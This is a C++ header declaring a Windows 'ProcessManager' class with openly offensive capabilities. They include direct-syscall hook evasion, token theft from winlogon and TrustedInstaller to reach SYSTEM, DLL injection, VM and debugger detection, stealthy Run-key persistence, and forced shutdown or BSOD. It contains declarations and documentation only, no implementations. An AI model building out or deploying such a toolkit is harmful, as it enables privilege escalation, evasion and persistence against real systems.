#pragma once

#include <string> // std::string
#include <unordered_map> // std::unordered_map
#include <windows.h>
#include <winternl.h>
#include <any> // std::any 
#include <iostream> // std::cout, std::endl

/*
    NTAPI functions return a LONG. 
    This return value indicates the function
    was successful.
*/
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

/*
    https://ntdoc.m417z.com/shutdown_action
    
    Undocumented enum used by the Windows API,
    particularly NtShutdownSystem. Denotes the type of
    shutdown for NtShutdownSystem to perform.
*/
typedef enum _SHUTDOWN_ACTION {
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff
} SHUTDOWN_ACTION, *PSHUTDOWN_ACTION;

/*
    https://ntdoc.m417z.com/client_id

    Typedef for _CLIENT_ID that doesn't exist
    in documented Windows headers for some reason.ABC

    PCLIENT_ID contains a unique thread and process ID 
    Used to start processes by process ID with NtOpenProcess.
*/
typedef struct _CLIENT_ID *PCLIENT_ID;

extern "C" {
    /**
     * https://ntdoc.m417z.com/ntopenprocess
     * Opens an existing process object.
     *
     * @param ProcessHandle A pointer to a handle that receives the process object handle.
     * @param DesiredAccess The access rights desired for the process object.
     * @param ObjectAttributes A pointer to an OBJECT_ATTRIBUTES structure that specifies the attributes of the new process.
     * @param ClientId Optional. A pointer to a CLIENT_ID structure that specifies the client ID of the process to be opened.
     * @return NTSTATUS Successful or errant status.
     */
    NTSTATUS SysNtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    );
    
    /**
     * The NtClose routine closes the specified handle.
     *
     * @param Handle The handle being closed.
     * @return NTSTATUS Successful or errant status.
     * @sa https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwclose
     */
    NTSTATUS SysNtClose(HANDLE handle);
    
    /**
     * The NtDuplicateToken function creates a handle to a new access token that duplicates an existing token.
     *
     * @param ExistingTokenHandle A handle to an existing access token that was opened with the TOKEN_DUPLICATE access right.
     * @param DesiredAccess ACCESS_MASK structure specifying the requested types of access to the access token.
     * @param ObjectAttributes Pointer to an OBJECT_ATTRIBUTES structure that describes the requested properties for the new token.
     * @param EffectiveOnly A Boolean value that indicates whether the entire existing token should be duplicated into the new token or just the effective (currently enabled) part of the token.
     * @param Type Specifies the type of token to create either a primary token or an impersonation token.
     * @param NewTokenHandle Pointer to a caller-allocated variable that receives a handle to the newly duplicated token.
     * @return NTSTATUS Successful or errant status.
     * @remarks https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntduplicatetoken
     */
    NTSTATUS SysNtDuplicateToken(
        HANDLE ExistingTokenHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        BOOLEAN EffectiveOnly,
        TOKEN_TYPE Type,
        PHANDLE NewTokenHandle
    );
    
    
    /**
     * The NtOpenProcessTokenEx routine opens the access token associated with a process, and returns a handle that can be used to access that token.
     *
     * @param ProcessHandle Handle to the process whose access token is to be opened. The handle must have PROCESS_QUERY_INFORMATION access.
     * @param DesiredAccess ACCESS_MASK structure specifying the requested types of access to the access token.
     * @param HandleAttributes Attributes for the created handle. Only OBJ_KERNEL_HANDLE is currently supported.
     * @param TokenHandle Pointer to a caller-allocated variable that receives a handle to the newly opened access token.
     * @return NTSTATUS Successful or errant status.
     * @remarks https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntopenprocesstokenex
     */
    NTSTATUS SysNtOpenProcessTokenEx(
        HANDLE processHandle,
        ACCESS_MASK desiredAccess,
        ULONG handleAttributes,
        PHANDLE tokenHandle
    );
    
    /**
     * Sends a HARDERROR_MSG LPC message to listener (typically CSRSS.EXE).
     * The function used to cause a Blue Screen.
     * 
     * @param ErrorStatus Error code to be displayed on the Blue Screen
     * @param NumberOfParameters Number of optional parameters in Parameters array.
     * @param UnicodeStringParameterMask Optional string parameter (can be only one per error code).
     * @param Parameters Array of DWORD parameters for use in error message string.
     * @param ValidResponseOptions An enum of HARDERROR_RESPONSE_OPTION. See https://ntdoc.m417z.com/harderror_response_option
     * @param Response Pointer to HARDERROR_RESPONSE enum. Inserts the response indicated by the user.
     */
    NTSTATUS SysNtRaiseHardError(
        NTSTATUS ErrorStatus,
        ULONG NumberOfParameters,
        ULONG UnicodeStringParameterMask,
        PULONG_PTR Parameters,
        ULONG ValidResponseOptions,
        PULONG Response
    );
    
    /**
     * Used to ensure the calling thread is not impersonating any security context.
     * 
     * @returns NTSTATUS
     */
    NTSTATUS SysNtRevertContainerImpersonation();
    
    /**
     * Creates a new registry key routine or opens an existing one.
     *
     * @param[out] KeyHandle A pointer to a handle that receives the key handle.
     * @param[in] DesiredAccess The access mask that specifies the desired access rights.
     * @param[in] ObjectAttributes A pointer to an OBJECT_ATTRIBUTES structure that specifies the object attributes.
     * @param[in] TitleIndex Reserved.
     * @param[in, optional] Class A pointer to a UNICODE_STRING structure that specifies the class of the key.
     * @param[in] CreateOptions The options to use when creating the key.
     * @param[out, optional] Disposition A pointer to a variable that receives the disposition value.
     * @return NTSTATUS Successful or errant status.
     */
    NTSTATUS SysNtCreateKey(
        PHANDLE KeyHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        ULONG TitleIndex,
        PUNICODE_STRING Class,
        ULONG CreateOptions,
        PULONG Disposition
    );
    
    /**
     * Sets the value of a registry key.
     *
     * @param[in] KeyHandle A handle to the key to be modified.
     * @param[in] ValueName A pointer to a UNICODE_STRING structure that specifies the name of the value to be set.
     * @param[in, optional] TitleIndex Reserved.
     * @param[in] Type The type of the value.
     * @param[in] Data A pointer to a buffer that contains the value data.
     * @param[in] DataSize The size of the buffer.
     * @return NTSTATUS Successful or errant status.
     */
    NTSTATUS SysNtSetValueKey(
        HANDLE KeyHandle,
        PUNICODE_STRING ValueName,
        ULONG TitleIndex,
        ULONG Type,
        PVOID Data,
        ULONG DataSize
    );
    
    /**
     * The NtDelayExecution routine suspends the current thread until the specified condition is met.
     *
     * @param Alertable The function returns when either the time-out period has elapsed or when the APC function is called.
     * @param DelayInterval The time interval for which execution is to be suspended, in milliseconds.
     * - A value of zero causes the thread to relinquish the remainder of its time slice to any other thread that is ready to run.
     * - If there are no other threads ready to run, the function returns immediately, and the thread continues execution.
     * - A value of INFINITE indicates that the suspension should not time out.
     * @return NTSTATUS Successful or errant status. The return value is STATUS_USER_APC when Alertable is TRUE, and the function returned due to one or more I/O completion callback functions.
     * @remarks Note that a ready thread is not guaranteed to run immediately. Consequently, the thread will not run until some arbitrary time after the sleep interval elapses,
     * based upon the system "tick" frequency and the load factor from other processes.
     * @see https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex
     */
    NTSTATUS SysNtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
    
    /**
     * Forcefully shuts down the system. This function does not warn processes.
     * 
     * @param The type of SHUTDOWN_ACTION to perform. For example, ShutdownReboot would
     *        tell the system to restart. 
     */
    NTSTATUS SysNtShutdownSystem(SHUTDOWN_ACTION action);

    /**
     * Returns the address of the process environment block (PEB) for the current process.
     * @return Pointer to a PEB struct containing information about the current processes
     *         process environment block (PEB)
     */
    PPEB GetPebAddress();
}

/*
    Handles to dynamically loaded modules.
    These are initialized in the ProcessManager constructor.
*/
inline HMODULE Kernel32DLL = nullptr;
inline HMODULE NTDLL       = nullptr;
inline HMODULE AdvApi32DLL = nullptr;

/*
    A bool denoted whether or not the above modules
    have been loaded.
*/
inline bool DllsLoaded = false;

/**
 * A struct representing a function pointer.
 * 
 * fp is the function signature of the function pointer.
 * For example, an 'fp' template type could look something like
 * SC_HANDLE(WINAPI* _OpenServiceA)( SC_HANDLE, LPCSTR, DWORD )
 * 
 * Above, you would use 'call' like so:
 * function_pointer.call(scm_manager, service_name, GENERIC_READ)
 * 
 * @param call The function pointer that will be called. This should not be NULL.
 * @param name The name of the function.
 * @param from The handle of the module this function is from
 */
template <typename fp>
struct FunctionPointer {
    fp          call;
    std::string name;
    HMODULE     from;
};

/*
    A simple class representing the different
    levels of security context in Windows.

    Specifically for the ProcessManager class to tell
    what context the process token is.
*/
enum class SecurityContext {
    User,
    Admin,
    System,
    TrustedInstaller,
    Highest = TrustedInstaller,
};

/**
 * @class ProcessManager
 * @brief Provides advanced Windows process manipulation and system interaction capabilities
 *
 * The ProcessManager class offers a comprehensive suite of tools for:
 * - Process and token manipulation
 * - Privilege escalation (User → Admin → System → TrustedInstaller)
 * - System modification and interrogation
 * - Anti-debugging and VM detection
 * - Native API access through direct syscalls
 *
 * Key features include:
 * - Token stealing and impersonation
 * - Service control and management  
 * - Registry manipulation
 * - System shutdown/BSOD capabilities
 * - Secure function address resolution

 *
 * @note All operations maintain thread safety and proper handle cleanup
 * @warning Many methods require elevated privileges to function properly
 */
class ProcessManager {
public:
    /**
     * @brief Constructs a ProcessManager and initializes essential system libraries for operation
     * 
     * Automatically loads kernel32.dll, advapi32.dll, and ntdll.dll either from already loaded modules
     * or via LoadLibrary if not found, and initializes the native function cache required for all functionality.
     */
    ProcessManager();

    bool 
    ReadProcessMemory(
        HANDLE process,
        LPVOID baseAddress,
        LPVOID buffer,
        size_t size
    );

    bool 
    WriteProcessMemory(
        HANDLE process,
        LPVOID baseAddress,
        LPVOID buffer,
        size_t size
    );

    bool 
    EnableTokenPrivilege(
        HANDLE token, 
        const std::string& priv
    );

    bool 
    DisableTokenPrivilege(
        HANDLE token, 
        const std::string& priv
    );

    bool
    InjectDll(
        DWORD pid,
        const std::string& dllPath
    );

    bool
    EjjectDll(
        DWORD pid,
        const std::string& dllName
    );

    /**
     * @brief Internal function to retrieve the address of an exported function from a module by parsing PE headers directly
     * 
     * This function locates the export directory in the module's memory and searches through exported functions by name to find a match,
     * handling both named exports and ordinal exports through the name table without using GetProcAddress.
     * 
     * @param lib The HMODULE handle of the module to search
     * @param procedure The name of the function to find
     * @return FARPROC address of the function if found, NULL otherwise
     */
    static FARPROC 
    GetFunctionAddressInternal(
        HMODULE lib,
        std::string procedure
    );

    /**
     * @brief Public interface to get a loaded module with caching for frequently accessed libraries
     * 
     * Checks the internal cache first before falling back to GetLoadedModule for better performance
     * when the same libraries are accessed multiple times.
     * 
     * @param libName The name of the library to retrieve
     * @return HMODULE handle to the loaded library if found, NULL otherwise
     */
    HMODULE 
    GetLoadedLib(const std::string& libName);
    
    /**
     * @brief Frees a previously loaded library and removes it from the internal cache
     * 
     * Uses the cached HMODULE to call FreeLibrary and cleans up the cache entry, but only works
     * with libraries that were loaded through this manager's mechanisms.
     * 
     * @param lib The name of the library to free
     * @return true if successfully freed, false otherwise
     */
    bool 
    FreeUsedLibrary(const std::string& lib);

    /**
     * @brief Retrieves the System Service Number (SSN) for a given NT function by scanning its bytecode
     * 
     * Locates the characteristic syscall pattern (0xB8) in the function's memory to extract the system call number,
     * primarily used for direct syscall invocation bypassing standard API calls.
     * 
     * @param lib The module containing the function (typically ntdll.dll)
     * @param functionName The name of the NT function to find
     * @return unsigned int SSN if found, -1 on failure
     */
    static int 
    GetSSN(
        HMODULE lib,
        std::string functionName
    );

    /**
     * @brief Detects if the current process is running in a virtual machine by scanning system firmware
     * 
     * Checks firmware tables for known virtualization vendor strings including QEMU, VirtualBox, VMware,
     * Hyper-V, Xen, KVM, and various sandbox indicators using GetSystemFirmwareTable for low-level access.
     * 
     * @return true if running in a VM, false otherwise
     */
    bool 
    RunningInVirtualMachine();

    /**
     * @brief Adds a process to Windows startup registry keys using direct NTAPI calls
     * 
     * Creates a registry entry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run while
     * avoiding common API hooks through the use of native registry functions for stealth operations.
     * 
     * @param path The full path to the executable to run at startup
     */
    void
    AddProcessToStartup(std::string path);

    /**
     * @brief Initiates a system shutdown/reboot with required privilege elevation
     * 
     * Automatically elevates privileges using RtlAdjustPrivilege before calling the shutdown
     * and reverts any container impersonation before execution for proper privilege context.
     * 
     * @param type The type of shutdown action (poweroff, reboot, etc.)
     */
    static void 
    ShutdownSystem(SHUTDOWN_ACTION type);

    /**
     * @brief Triggers a system crash (BSOD) for testing or emergency termination
     * 
     * Elevates privileges and calls NtRaiseHardError with critical status after ensuring
     * proper privilege context through container impersonation reversion.
     */
    void BSOD();
    
    /**
     * @brief Finds a process ID by its executable name through process snapshot enumeration
     * 
     * Uses CreateToolhelp32Snapshot to examine running processes and performs case-sensitive
     * comparison of executable names to locate the target process.
     * 
     * @param name The process name to search for
     * @return DWORD process ID if found, -1 otherwise
     */
    DWORD
    PIDFromName(const char* name);

    /**
     * @brief Creates an access token from a target process for impersonation attacks
     * 
     * Opens the target process and duplicates its primary token with maximum privileges,
     * serving as the foundation for token stealing and privilege escalation techniques.
     * 
     * @param processID The PID of the target process
     * @param ti Whether to create a TrustedInstaller-level token
     * @return HANDLE to the duplicated token, NULL on failure
     */
    HANDLE
    CreateProcessAccessToken(
        DWORD processID, 
        bool ti=false
    );

    /**
     * @brief Starts a Windows service and returns its process ID after full initialization
     * 
     * Manages the complete service startup sequence including handling pending states and
     * uses SCM with minimal required privileges for proper service control operations.
     * 
     * @param serviceName The name of the service to start
     * @return DWORD PID of the service process if successful, -1 otherwise
     */
    DWORD
    StartWindowsService(const std::string& serviceName);

    /**
     * @brief Begins impersonation with a stolen token using ImpersonateLoggedOnUser
     * 
     * Provides a wrapper around ImpersonateLoggedOnUser with proper error handling while
     * maintaining the caller's responsibility for token handle management and cleanup.
     * 
     * @param token The token to impersonate
     * @return HANDLE to the token if successful, NULL otherwise
     */
    HANDLE
    ImpersonateWithToken(HANDLE token);

    /**
     * @brief Obtains a SYSTEM-level token by duplicating winlogon.exe's token
     * 
     * Locates the winlogon process, duplicates its token with maximum privileges,
     * begins impersonation, and updates both m_Context and m_ElevatedToken accordingly.
     * 
     * @return HANDLE to the SYSTEM token if successful, NULL otherwise
     */
    HANDLE 
    GetSystemToken();

    /**
     * @brief Retrieves the current security context level of the ProcessManager
     * 
     * Returns the highest privilege level achieved during the ProcessManager's operations,
     * which is automatically updated by security-critical functions like GetSystemToken().
     * The security context progresses through User → Admin → System → TrustedInstaller levels.
     * 
     * @return SecurityContext The current security context level
     * @see SetThisContext()
     * @see GetSystemToken()
     * @see GetTrustedInstallerToken()
     * @see ElevatedPermissions()
     */
    inline const SecurityContext 
    GetProcessSecurityContext() const { return this->m_Context; }
    
    /**
     * @brief Obtains a TrustedInstaller-level token through service manipulation
     * 
     * Starts the TrustedInstaller service if needed, duplicates its token for impersonation,
     * requires existing SYSTEM privileges, and updates security context to TrustedInstaller.
     * 
     * @return HANDLE to the TrustedInstaller token if successful, NULL otherwise
     */
    HANDLE 
    GetTrustedInstallerToken();

    /**
     * @brief Checks for debugger attachment through the PEB's BeingDebugged flag
     * Provides basic anti-debugging capability by examining the process environment block
     * without employing more advanced detection techniques that might be available.
     * @return true if a debugger is detected, false otherwise
     */
    static bool 
    BeingDebugged();

    /**
     * @brief Retrieves the current elevated token handle stored in the ProcessManager
     * 
     * Provides access to the cached token handle that was previously acquired through 
     * privilege escalation operations like GetSystemToken() or GetTrustedInstallerToken().
     * 
     * @return HANDLE The stored elevated token if one exists, otherwise NULL
     * @note The returned handle remains owned by the ProcessManager and should not be closed by the caller
     * @see GetSystemToken()
     * @see GetTrustedInstallerToken()
     */
    inline HANDLE
    GetToken() const { return this->m_ElevatedToken; }
    
    /**
     * @brief Creates a new process with stolen token credentials and optional output capture
     * 
     * Uses the stolen token to spawn a process with impersonated credentials while optionally
     * redirecting standard handles through pipes to capture command output when requested.
     * 
     * @param token The token to impersonate
     * @param dwLogonFlags Logon flags for CreateProcessWithToken
     * @param lpApplicationName Path to the executable
     * @param lpCommandLine Command line arguments
     * @param dwCreationFlags Process creation flags
     * @param lpEnvironment Environment block
     * @param lpCurrentDirectory Working directory
     * @param saveOutput Whether to capture process output
     * @param[out] cmdOutput String to receive process output if saveOutput is true
     * @return true if process created successfully, false otherwise
     */
    bool 
    OpenProcessAsImposter(
        HANDLE token, 
        DWORD dwLogonFlags, 
        LPCWSTR lpApplicationName, 
        LPWSTR lpCommandLine, 
        DWORD dwCreationFlags, 
        LPVOID lpEnvironment, 
        LPCWSTR lpCurrentDirectory, 
        bool saveOutput, 
        std::string& cmdOutput
    );

    /**
     * @brief Checks if the current process has elevated privileges through token examination
     * 
     * Queries the process token for elevation status using TokenElevation information class
     * and updates both the return value and m_Context for accurate privilege tracking.
     * 
     * @return true if running with elevated privileges, false otherwise
     */
    bool 
    ElevatedPermissions();

    /**
     * @brief Retrieves a cached native function pointer by name with type safety
     * 
     * Looks up a previously loaded native function in the m_Natives cache and returns it
     * wrapped in a FunctionPointer struct for type-safe usage. Returns empty struct if not found.
     * 
     * @tparam fp The function pointer type to retrieve
     * @param name The name of the native function to get
     * @return FunctionPointer<fp> containing the function pointer if found, empty otherwise
     */
    template <typename fp>
    inline const FunctionPointer<fp> 
    GetNative(const std::string& name) {
        if ( !this->m_Natives.contains(name) )
            return {};

        return std::any_cast< FunctionPointer<fp> >( this->m_Natives.at(name) );
    }

    /**
     * @brief Gets a function address from a module with proper type casting
     * 
     * Wrapper around GetFunctionAddressInternal that handles type conversion to the specified
     * function pointer type for safer usage of retrieved function pointers.
     * 
     * @tparam fpType The function pointer type to cast to
     * @param lib The module handle to search in
     * @param proc The name of the function to find
     * @return fpType casted function pointer if found, nullptr otherwise
     */
    template <typename fpType>
    static inline fpType 
    GetFunctionAddress(HMODULE lib, const std::string& proc) {
        return reinterpret_cast< fpType >( GetFunctionAddressInternal(lib, proc) );
    }
    
    /**
     * @brief Directly calls a function from a module with variadic arguments
     * 
     * Combines function lookup and invocation in one step for convenience, automatically
     * forwarding provided arguments to the target function with perfect forwarding.
     * 
     * @tparam fpType The function pointer type to call
     * @tparam Args Variadic template for argument types
     * @param lib The module handle containing the function
     * @param name The name of the function to call
     * @param args Variadic arguments to forward to the function
     * @return auto The result of the called function
     */
    template <typename fpType, typename ...Args>
    static inline auto 
    Call(HMODULE lib, std::string name, Args&&... args) noexcept {
        return GetFunctionAddress<fpType>(lib, name)( std::forward<Args>(args)... );
    }

    inline const bool 
    NativesLoaded() const { return this->m_NativesLoaded; }

private:
    /**
     * @brief Loads a native Windows API function and stores it in the function cache for later use
     * 
     * The template function retrieves a function pointer and stores it with metadata in m_Natives,
     * providing error reporting if the function isn't found while maintaining type safety.
     * 
     * @tparam type The function pointer type
     * @param name The name of the function to load
     * @param from The module to load the function from
     */
    template <typename type>
    void 
    LoadNative(
        const std::string& name,
        HMODULE from
    );

    /**
     * @brief Loads all essential native Windows API functions into the function cache
     * 
     * Caches function pointers for frequently used APIs across kernel32 and advapi32,
     * executing only once per ProcessManager instance through the m_NativesLoaded flag.
     */
    void 
    LoadAllNatives();
    
    /**
     * @brief Retrieves the base address of a loaded module by searching the PEB's loader data
     * 
     * This function maintains a cache of found modules in m_LoadedDLLs to avoid repeated PEB traversal and performs
     * case-insensitive searches against both base names and full paths of loaded modules.
     * 
     * @param libName The name of the module to find (case insensitive)
     * @return HMODULE handle to the module if found, NULL otherwise
     */
    HMODULE 
    GetLoadedModule(std::string libName);

    /**
     * @brief Updates the current security context of the ProcessManager to track privilege level
     * 
     * Only allows increasing the context level (User < Admin < System < TrustedInstaller) to
     * maintain awareness of the highest privilege level achieved during operations.
     * 
     * @param newContext The new security context level
     */
    void
    SetThisContext(SecurityContext newContext);

    /**
     * @brief Cache of loaded native Windows API functions
     * 
     * Stores function pointers wrapped in std::any with their associated metadata
     * for type-safe access through GetNative(). Populated by LoadAllNatives().
     */
    inline static std::unordered_map<std::string, std::any> m_Natives;

    /**
     * @brief Cache of loaded module handles
     * 
     * Maps lowercase module names to their HMODULE values to avoid repeated
     * PEB traversal. Managed by GetLoadedModule() and FreeUsedLibrary().
     */
    std::unordered_map<std::string, HMODULE> m_LoadedDLLs;

    /**
     * @brief Flag indicating native functions are loaded
     * 
     * Set to true after successful LoadAllNatives() execution to prevent
     * redundant loading of API functions.
     */
    bool m_NativesLoaded = false;

    /**
     * @brief Current security context level
     * 
     * Tracks the highest privilege level achieved, automatically updated by
     * security-sensitive operations. Used to enforce proper privilege hierarchy.
     */
    SecurityContext m_Context = SecurityContext::User;

    /**
     * @brief Handle to current elevated token
     * 
     * Stores tokens acquired through privilege escalation (GetSystemToken(),
     * GetTrustedInstallerToken()). Owned and managed by the ProcessManager.
     */
    HANDLE m_ElevatedToken = NULL;
};